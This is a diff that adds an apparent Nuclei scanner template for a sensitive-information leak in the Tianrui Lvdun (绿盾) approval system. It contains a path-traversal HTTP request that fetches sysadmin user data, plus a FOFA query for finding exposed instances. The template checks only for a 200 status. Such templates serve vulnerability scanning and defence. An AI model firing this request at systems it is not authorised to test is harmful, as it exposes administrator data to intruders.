@@ -1,0 +1,19 @@
+id: poc-opf4snvbaw190h4b
+info:
+  name: 天锐绿盾审批系统 sysadmin 存在敏感信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/opf4snvbaw190h4b'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: opf4snvbaw190h4b
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
